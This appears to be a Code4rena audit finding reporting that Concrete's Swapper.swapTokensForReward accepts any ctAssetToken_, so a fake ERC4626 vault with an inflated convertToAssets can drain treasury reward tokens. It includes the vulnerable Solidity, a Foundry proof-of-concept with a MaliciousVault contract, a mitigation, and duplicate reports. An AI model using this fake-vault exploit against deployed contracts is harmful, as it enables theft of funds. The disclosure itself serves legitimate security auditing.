@@ -1,0 +1,270 @@
+News
+
+Leaderboard
+
+Submissions
+
+Explore C4
+
+Audits
+
+Bounties
+
+Reports
+
+Support
+
+Resources
+
+Docs
+
+Terms
+
+Privacy
+
+saraswati
+Submissions
+Concrete
+/
+F-39
+High
+Primary
+S-947
+Missing validation for `ctAssetToken_` in `swapTokensForReward` allows attacker to drain treasury account of reward tokens
+nnez
+87
+Sufficient
+383d ago
+Impact
+
+The vulnerability allows malicious actors to exploit the swapTokensForReward function by supplying a malicious vault token (ctAssetToken_). By manipulating the convertToAssets function of the fake vault, attackers can inflate the converted asset amount arbitrarily. This inflated amount can then be used to claim excessive amounts of registered reward tokens from the treasury.
+
+Description
+
+Swapper contract allows users to swap their ctAssetToken for a registered reward token held in the treasury by invoking swapTokensForReward function.
+
+See: https://github.com/code-423n4/2024-11-concrete/blob/main/src/swapper/Swapper.sol#L78-L98
+
+// File: 2024-11-concrete/src/swapper/Swapper.sol
+function swapTokensForReward(
+    address ctAssetToken_,
+    address rewardToken_,
+    uint256 ctAssetAmount_
+) external nonReentrant {
+    if (!_tokenRegistry.isRewardToken(rewardToken_)) revert Errors.NotValidRewardToken(rewardToken_);
+
+    uint256 rewardAmount = _quoteSwapFromCtAssetToReward(ctAssetToken_, rewardToken_, ctAssetAmount_);
+
+    if (!amountAvailableForWithdrawal(rewardToken_, rewardAmount)) {
+        revert Errors.NotAvailableForWithdrawal(rewardToken_, rewardAmount);
+    }
+
+    // first send the ctAsset tokens to the treasury
+    IERC20(ctAssetToken_).safeTransferFrom(msg.sender, address(_treasury), ctAssetAmount_);
+    // this isn't an issue because the msg,sender first need to pay with the ctAsset token
+    // slither-disable-next-line arbitrary-send-erc20
+    IERC20(rewardToken_).safeTransferFrom(address(_treasury), msg.sender, rewardAmount);
+
+    emit Swapped(msg.sender, ctAssetToken_, rewardToken_, ctAssetAmount_, rewardAmount);
+}
+
+The function works as follows:
+
+Reward token validation
+The function first checks if the reward token provided is registered in the TokenRegistry contract. Only registered tokens are eligible for reward swaps.
+Conversion to stable amount
+The _convertFromCtAssetTokenToStable function is used to convert the user's ctAssetToken_ amount into its stablecoin equivalent.
+The conversion involves:
+Retrieving the underlying asset of the ctAssetToken_ using the asset() function.
+Converting the ctAssetAmount_ into the amount of the underlying asset using convertToAssets().
+Converting the underlying asset amount to stable amount using price from Oracle.
+Reward calcuation
+The stablecoin amount is used to calculate the reward rate and determine the amount of reward token to transfer.
+
+The issue lies in the lack of validation for ctAssetToken_ in _convertFromCtAssetTokenToStable.
+See: https://github.com/code-423n4/2024-11-concrete/blob/main/src/swapper/OraclePlug.sol#L57-L67
+
+File: 2024-11-concrete/src/swapper/OraclePlug.sol
+function _convertFromCtAssetTokenToStable(
+    address ctAssetToken_,
+    uint256 ctAssetAmount_
+) internal view returns (uint256 stableAmount) {
+    // get asset and amount from ctAssetToken
+    IERC4626 vaultToken = IERC4626(ctAssetToken_);
+    address asset = vaultToken.asset();
+    uint256 assetAmount = vaultToken.convertToAssets(ctAssetAmount_);
+    // convert assetAmount to stable
+    stableAmount = _convertFromTokenToStable(asset, assetAmount);
+}
+
+An attacker can supply a malicious vault token that:
+
+Implements the IERC4626 interface.
+Returns a legitimate asset from asset().
+Manipulates the convertToAssets() function to return an arbitrarily inflated value.
+
+As a result, attacker can drain all reward tokens from treasury account using a fake vault.
+
+Proof-of-Concept
+
+The following test creates a malicious contract that returns legitimate asset and arbitrary amount when calling convertToAssets then use it to swap for reward token via Swapper contract.
+
+It does so by adding an attack scenario at the end of test_swapTokensForReward as this can be seen as a legitimate setup of Swapper contract.
+
+Steps
+Apply the following git diff
+diff --git a/test/Swapper.t.sol b/test/Swapper.t.sol
+index 18268f5..eea6825 100644
+--- a/test/Swapper.t.sol
++++ b/test/Swapper.t.sol
+@@ -17,6 +17,21 @@ import {TokenRegistry} from "../src/registries/TokenRegistry.sol";
+ import {MockBeraOracle} from "./utils/mocks/MockBeraOracle.sol";
+ import {Errors} from "../src/interfaces/Errors.sol";
+ 
++contract MaliciousVault{
++    address public immutable asset;
++    constructor(address _asset){
++        asset = _asset;
++    }
++    function convertToAssets(uint256 shares) public view returns (uint256){
++        return 1_000e18; // arbitrary amount
++    }
++
++    function transferFrom(address from, address to, uint256 value) public view returns (bool){
++        return true;
++    }
++
++}
++
+ contract StrategyBaseTest is Test, SwapperEvents {
+     using Math for uint256;
+ 
+@@ -153,6 +168,17 @@ contract StrategyBaseTest is Test, SwapperEvents {
+         vm.stopPrank();
+         // assert that the balance of reward tokens in the treasury is correct
+         assertEq(rewardToken.balanceOf(hazel), totalRewardTokenAmount, "Reward Token balance Of Hazel");
++
++        address attacker = makeAddr("attacker");
++        vm.startPrank(attacker);
++        console.log("before: ", rewardToken.balanceOf(attacker));
++        assertEq(rewardToken.balanceOf(attacker), 0);
++        MaliciousVault attackerVault = new MaliciousVault(address(asset));
++        swapper.swapTokensForReward(address(attackerVault), address(rewardToken), 100e27);
++        console.log("after: ", rewardToken.balanceOf(attacker));
++        assertGt(rewardToken.balanceOf(attacker), 0);
++        vm.stopPrank();
++
+     }
+ 
+     // test error when there is not sufficient for withdrawal
+
+Run forge t --match-contract StrategyBaseTest --match-test test_swapTokensForReward -vv
+Observe that attacker can use a malicious vault to swap for reward tokens.
+Recommended Mitigations
+Validate that ctAssetToken_ is registered in VaultRegistry
+Links to affected code
+Swapper.sol#L78-L98
+Opens in a new window
+OraclePlug.sol#L57-L67
+Opens in a new window
+Submissions touching same files
+Swapper.sol
+OraclePlug.sol
+View full submission
+Duplicates
+19
+S-857
+`swapTokensForReward` Allows Exploitation of Malicious `ctAssetToken_` to Drain `Treasury`
+waydou
+75
+S-1014
+Swapper vulnerable to malicious ERC4626 vaults allowing theft of reward tokens through inflated asset conversion rates
+0xNirix
+72
+S-682
+Attacker can drain the treasury
+blutorque
+65
+S-1310
+The `Swapper` contract can be fully drained due to arbitrary inputs
+samuraii77
+63
+S-851
+Attacker can drain the treasury as Swapper contract does not verify `ctAssetToken` is an actual Vault token
+deadrxsezzz
+61
+S-792
+Reward Treasury can be drained
+trachev
+56
+S-482
+Attackers can exploit malicious ctAssetToken to acquire rewards almost cost-free through the `Swapper.swapTokensForReward`
+bearonbike
+54
+S-36
+users can pass arbitrary `ctAssetToken` and receive rewardToken
+kodyvim
+47
+S-349
+Reward tokens can be stolen due to unvalidated user supplied `ctAssetToken` address in `swapTokensForReward()`
+t0x1c
+46
+S-1049
+`Swapper` contract allows swapping of arbitrary vault tokens, leading to treasury drain
+Maroutis
+37
+S-224
+User Can Input Malicious CT token and Withdraw Reward Tokens To Drain Treasury
+boraichodrunkenmaster
+26
+S-1377
+All Reward Tokens Can Be Drained from Treasury by Passing a Malicious Token
+ishtagy
+00
+S-1028
+Rewards can be stolen from the treasury by swapping malicious ctAsset tokens
+berndartmueller
+00
+S-747
+Unrestricted `ctAssetToken_` Allows Users to Manipulate Rewards Within `swapForRewards` Function
+Shen
+00
+S-453
+Malicious vault can drain all reward token from treasury
+0x37
+00
+S-404
+A malicious user can steal rewards due to missing check on `ctAssetToken_` in the function `swapTokensForReward`
+hearmen
+00
+S-373
+Missing ctAsset Validation in Swapper Enables Direct Treasury Fund Drain
+a2security
+00
+S-175
+Malicious contract can call `swapTokensForReward()` in `Swapper.sol` and drain the treasury
+gr8tree
+00
+S-37
+Missing input validation allows attacker to drain rewards from treasury
+muellerberndt
+00
+Timeline
+Submitted
+Created: 542d ago
+High
+Triage
+High
+Valid
+Primary
+Sufficient
+Review
+Accepted
+Judging
+High
+Valid
+Sufficient
+Post-judging QA
+Complete
+Reporting
+Complete
